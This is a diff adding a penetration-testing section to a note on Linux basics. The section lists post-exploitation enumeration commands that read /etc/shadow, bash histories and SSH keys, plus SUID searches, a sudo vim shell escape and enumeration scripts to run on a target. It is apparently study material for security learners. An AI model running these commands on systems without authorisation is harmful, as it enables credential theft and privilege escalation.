@@ -39,3 +39,73 @@ Linux is an open-source operating system that serves as an alternative to popula
 - If you're new to Linux, there are plenty of online resources and tutorials to help you get started. Websites like Linux Journey, Ubuntu Documentation, and the Arch Wiki provide valuable information.
 
 In summary, Linux is a versatile operating system with a strong emphasis on customization, security, and community collaboration. While it may take some time to become familiar with its nuances, learning Linux can be a rewarding experience, offering you a deeper understanding of how computer systems work.
+
+---
+
+## Linux for penetration testers
+
+Linux is both the attacker's platform (Kali/Parrot) and the most common server target. You must be fluent in navigating and escalating on it.
+
+### Post-exploitation enumeration (run right after getting a shell)
+
+```bash
+# Who am I and what can I do?
+id; whoami; sudo -l
+hostname; uname -a; cat /etc/os-release
+
+# Users and interesting files
+cat /etc/passwd; cat /etc/shadow 2>/dev/null    # shadow = jackpot if readable
+ls -la /home/*; cat /home/*/.bash_history
+find / -name "id_rsa" 2>/dev/null               # SSH keys
+
+# Network and running services
+ip a; ss -tulpn; netstat -antup 2>/dev/null
+ps aux --forest
+
+# Scheduled jobs and services (privesc leads)
+cat /etc/crontab; ls -la /etc/cron.*
+systemctl list-timers
+```
+
+### Privilege escalation quick wins
+
+```bash
+# SUID/SGID binaries — check each against GTFOBins
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+
+# Writable files owned by root, world-writable dirs
+find / -writable -type f 2>/dev/null | grep -v /proc
+find / -perm -2 -type d 2>/dev/null
+
+# Sudo misconfig -> GTFOBins (e.g., sudo vim -c ':!/bin/sh')
+sudo -l
+
+# Kernel exploits — match version to known CVEs
+uname -r
+
+# Capabilities
+getcap -r / 2>/dev/null
+```
+
+### Automated enumeration
+
+```bash
+# Drop and run one of these on the target
+./linpeas.sh
+./LinEnum.sh
+python3 linux-exploit-suggester.py
+```
+
+### Key privesc vectors
+
+- **Sudo misconfigurations** → [GTFOBins](https://gtfobins.github.io/)
+- **SUID binaries** with exploitable behavior
+- **Writable `/etc/passwd`** or cron scripts
+- **Kernel exploits** (DirtyPipe, DirtyCow, PwnKit/polkit)
+- **Docker group membership** → instant root
+
+## Related
+
+- [Privilege Escalation](../Vulnerabilities/Privilege%20Escalation.md)
+- [Operating System Hardening](Operating%20System%20Hardening.md)
